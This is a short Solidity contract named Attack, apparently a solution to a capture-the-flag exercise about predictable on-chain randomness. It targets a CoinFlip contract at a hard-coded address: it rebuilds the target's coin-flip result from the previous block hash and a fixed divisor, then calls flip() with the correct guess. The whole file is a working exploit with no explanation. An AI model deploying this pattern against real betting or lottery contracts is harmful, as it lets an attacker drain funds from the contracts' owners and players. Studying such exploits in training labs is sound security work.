pragma solidity ^0.6.0;

import '/bachang/SafeMath.sol';

interface  CoinFlip{

     function flip(bool _guess) external returns (bool);
     
}

contract Attack{

    using SafeMath for uint256;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip coin;

     constructor() public {
         coin = CoinFlip(0xEcEa554336dD957eC7976558D564aBbc05ab6187);
     }


    function attackGO() public {

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        
        bool side = coinFlip == 1 ? true : false;

        coin.flip(side);

    }
}